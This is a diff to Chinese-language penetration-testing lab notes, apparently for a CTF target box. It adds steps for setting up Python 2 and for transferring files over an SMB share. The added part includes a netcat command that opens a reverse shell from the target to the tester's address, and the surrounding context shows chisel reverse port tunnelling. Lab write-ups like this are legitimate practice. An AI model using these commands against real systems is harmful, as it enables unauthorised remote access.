@@ -90,3 +90,22 @@ C:\ProgramData>.\c.exe client 10.10.14.134:8000 R:8888:localhost:8888
 [★]$ chmod 777 chisel_1.6.0_linux_amd64
 [★]$ ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
 ```
+#### 关于python2的使用
+```
+[★]$ python2 -version
+[★]$ pyenv shell 2.7.18
+[★]$ python2 --version
+Python 2.7.18
+[★]$ python2 -m pip install requests
+[★]$ python2 -m pip install colorama
+```
+#### 关于上传文件
+```
+这个靶机遇到的问题就是无法使用python3 -m http.server Port
+[★]$ smbserver.py share . -smb2support 
+
+C:\xampp\htdocs\gym\upload> net use \\10.10.14.134\share
+C:\xampp\htdocs\gym\upload> copy \\10.10.14.134\share\nc64.exe C:\programdata\nc.exe
+C:\xampp\htdocs\gym\upload> \programdata\nc.exe -e cmd 10.10.14.134 443
+```
+_____________________________
